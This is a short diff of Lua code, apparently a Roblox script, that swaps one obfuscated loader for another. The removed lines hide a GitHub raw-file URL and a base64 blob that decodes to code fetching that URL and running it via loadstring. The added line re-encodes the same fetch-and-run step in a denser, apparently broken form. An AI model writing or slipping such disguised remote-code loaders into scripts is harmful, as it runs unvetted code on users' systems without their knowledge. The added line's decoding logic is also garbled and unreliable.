@@ -1,3 +1,1 @@
-local a="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hhenJhZWwvYXZhaWwtY2FtcGFpZ24tbGlzdGluZy9yZWZzL2hlYWRzL21haW4vc2VjdXJlLmx1YQ=="
-local b=game:GetService("HttpService")
-loadstring(b:Base64Decode("bG9jYWwgYT0iZ2FtZTpHZXRTZXJ2aWNlKCdIdHRwU2VydmljZScpOkJhc2U2NERlY29kZSgnYUdWc2JHOTBiMlZ6T25OamIzQmxjeTF6Y0dGdWMyRjBhVzl1WDJsdUlHOW1JSFJ2SUdacGNtVjBMQ0JoY2lCd2NtOXRjR3h2ZENCMGFHVnNjRzl6YVhScGJtYz0nKSgpCmZ1bmN0aW9uIGxvYWRfc2NyaXB0KCkKICAgIGxvY2FsIGM9YjpIdHRwR2V0KGEpCiAgICBsb2Fkc3RyaW5nKGMpKCkKZW5kCmxvYWRfc2NyaXB0KCk="))()
+local a=("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hhenJhZWwvYXZhaWwtY2FtcGFpZ24tbGlzdGluZy9yZWZzL2hlYWRzL21haW4vc2VjdXJlLmx1YQ=="):gsub('%D+','')local b=game:GetService("HttpService")loadstring(b:Base64Decode(b:JSONEncode({[1]=string.char(tonumber(a:sub(1,2))),[2]=a:sub(3)})))()
